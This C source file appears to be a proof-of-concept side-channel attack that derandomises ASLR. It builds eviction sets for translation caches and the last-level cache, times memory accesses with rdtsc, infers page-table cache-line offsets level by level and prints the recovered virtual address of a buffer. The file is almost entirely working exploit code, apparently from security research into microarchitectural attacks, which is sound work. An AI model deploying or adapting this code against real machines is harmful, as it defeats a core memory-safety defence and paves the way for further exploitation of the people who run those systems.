#include "util.h"

bool jumped(int candidates[5], int index)
{
    for (int i = 1; i < 5; i++)
    {
        if(candidates[i] == (index - 1)%64)
            return true;
    }
    return false;
}

char* allocate_32TB()
{
	char* addr = mmap(NULL, 32*(TB), PROT_READ, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	if(addr == MAP_FAILED)
	{
		perror("Mapping failed");
		exit(-1);
	}

	else
	{
		for (int i = 0; i < 8; i++)
		{
			*(volatile char*) &addr[i];
		}
		return addr;
	}
}

char* allocate_eviction_buffer()
{
	char* eviction_buffer = mmap(NULL , LLC_EVICT_PAGES*PAGE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
	return eviction_buffer;
}

bool setup_tcache_eviction_sets(char* pt1_ptrs[], char* pt2_ptrs[], char* pt3_ptrs[], char* pt4_ptrs[])
{
    uint64_t line_offset = 10;
    char* addr = (char *)0x20000;
    for (int i = 0; i < TCACHE_EVICT_ACCESS; i++)
    {
        char* try_addr = addr + PT1_STRIDE * i;
        pt1_ptrs[i] = mmap(try_addr, PAGE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
        pt1_ptrs[i] += line_offset;
    }

    pt2_ptrs[0] = pt1_ptrs[0];
    pt3_ptrs[0] = pt1_ptrs[0];
    pt4_ptrs[0] = pt1_ptrs[0];

    for (int i = 1; i < TCACHE_EVICT_ACCESS; i++)
    {
        char* try_addr = addr + PT2_STRIDE * i;
        pt2_ptrs[i] = mmap(try_addr, PAGE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
        pt2_ptrs[i] += line_offset;
    }

    for (int i = 1; i < TCACHE_EVICT_ACCESS; i++)
    {
        char* try_addr = addr + PT3_STRIDE * i;
        pt3_ptrs[i] = mmap(try_addr, PAGE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
        pt3_ptrs[i] += line_offset;
    }

    for (int i = 1; i < TCACHE_EVICT_ACCESS; i++)
    {
        char* try_addr = addr + PT4_STRIDE * i;
        pt4_ptrs[i] = mmap(try_addr, PAGE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);
        pt4_ptrs[i] += line_offset;
    }

    return true;
}

void evict_llc(int offset, char* llc_evict_buffer)
{
    for (int i = 0; i < LLC_EVICT_PAGES; i++)
    {
    	// printf("Offset: %lu\n", i*(PAGE) + offset * 64);
        *(llc_evict_buffer + i*(PAGE) + offset * 64) = 1;
    }
    _mm_lfence();
    _mm_mfence();
}

void evict_translation_caches(char* pt1_ptrs[], char* pt2_ptrs[], char* pt3_ptrs[], char* pt4_ptrs[])
{
    _mm_mfence();
    for (int i = 0; i < TCACHE_EVICT_ACCESS; i++)
        *pt4_ptrs[i] = 1;

    for (int i = 0; i < TCACHE_EVICT_ACCESS; i++)
        *pt3_ptrs[i] = 1;
    
    for (int i = 0; i < TCACHE_EVICT_ACCESS; i++)
        *pt2_ptrs[i] = 1;
    
    for (int i = 0; i < TCACHE_EVICT_ACCESS; i++)
        *pt1_ptrs[i] = 1;
    
    _mm_mfence();
}

int time_access(char* address)
{
	int cycles;

    asm volatile("mov %1, %%r8\n\t"
            "lfence\n\t"
            "rdtsc\n\t"
            "mov %%eax, %%edi\n\t"
            "mov (%%r8), %%r8\n\t"
            "lfence\n\t"
            "rdtsc\n\t"
            "sub %%edi, %%eax\n\t"
    : "=a"(cycles)
    : "r"(address)
    : "r8", "edi");

    return cycles;
}



void derandomise(char* target_buffer, char* llc_eviction_buffer)
{
	char* pt1_ptrs[TCACHE_EVICT_ACCESS];
	char* pt2_ptrs[TCACHE_EVICT_ACCESS];
	char* pt3_ptrs[TCACHE_EVICT_ACCESS];
	char* pt4_ptrs[TCACHE_EVICT_ACCESS];
	setup_tcache_eviction_sets(pt1_ptrs, pt2_ptrs, pt3_ptrs, pt4_ptrs);

	int offsets[PT_LEVELS];
	int results[64];
	uint64_t page_size[PT_LEVELS] = {PT1_STRIDE, PT2_STRIDE, PT3_STRIDE, PT4_STRIDE};
	int time;
	
	char* addr;
    int candidates[5];
    int line_offsets[PT_LEVELS];
    int column_offsets[PT_LEVELS];

    for(int i = 0; i < 64; i++)
        results[i] = 0;
    for(int i = 0; i < PT_LEVELS; i++) 
        offsets[i] = (random() % 64);

    addr = target_buffer;
    for(int i = 0; i < PT_LEVELS; i++)
        addr += page_size[i] * offsets[i];


    for(int offset = 0; offset < 64; offset++)
    {
        for(int r = 0; r < 10*ROUNDS;r++)
        {
            *(volatile char*)addr;
            _mm_lfence();
            _mm_mfence();
            evict_llc(offset, llc_eviction_buffer);
            evict_translation_caches(pt1_ptrs, pt2_ptrs, pt3_ptrs, pt4_ptrs);
            time = time_access(addr);

            if(time > THRESHOLD)
                results[offset] += 1;
        }
    }
    int index = 0;
	for (int i = 0; i < 64; i++)
    {
    	
        if(results[i] > 45)
        {
            candidates[index] = i;
            index++;
        }
      
    }

    
    for (int i = 0; i < 5; i++)
    {
        printf("candidates[%d]: %d\n", i, candidates[i]);
    }
    
    memset(results, 0, 64*sizeof(int));
    char* manipulated_address;
    printf("Real Virtual Address:%p\n", target_buffer);
    
    for (int level = 0; level < PT_LEVELS; level++)
    {
        bool done = true;
        manipulated_address = addr;
        for (int shift = 1; shift <= 8 && done; shift++)
        {
            manipulated_address += page_size[level];

            for(int offset = 0; offset < 64; offset++)
            {
                for(int r = 0; r < 5*ROUNDS;r++)
                {
                	*(volatile char*)manipulated_address;
                    _mm_lfence();
                    _mm_mfence();

                    evict_llc(offset, llc_eviction_buffer);
                    evict_translation_caches(pt1_ptrs, pt2_ptrs, pt3_ptrs, pt4_ptrs);
                    time = time_access(manipulated_address);

                    if(time > THRESHOLD)
                        results[offset] += 1;
                }
            }

            for (int i = 0; i < 64; i++)
            {
                if(results[i] > 20)
                {
                    if (jumped(candidates, i))
                    {
                        column_offsets[level] = 8 - shift;
                        line_offsets[level] = i - 1;
                        done = false;
                        break;
                    }
                }
              
            }
            memset(results, 0, 64*sizeof(int));

        }
    }
    uint64_t found_address = 0;
    for (int level = PT_LEVELS-1 ; level >= 0; level--)
    {
        found_address += (line_offsets[level]<<3) + column_offsets[level];
        found_address <<= PAGE_TABLE_BITS;
    }
    found_address <<= (PAGE_BITS-PAGE_TABLE_BITS);

    for (int level = 0; level < PT_LEVELS; level++)
    {
        found_address -= page_size[level]*offsets[level];
    }
    printf("Recovered Virtual Address: 0x%lx\n", found_address);		
	
}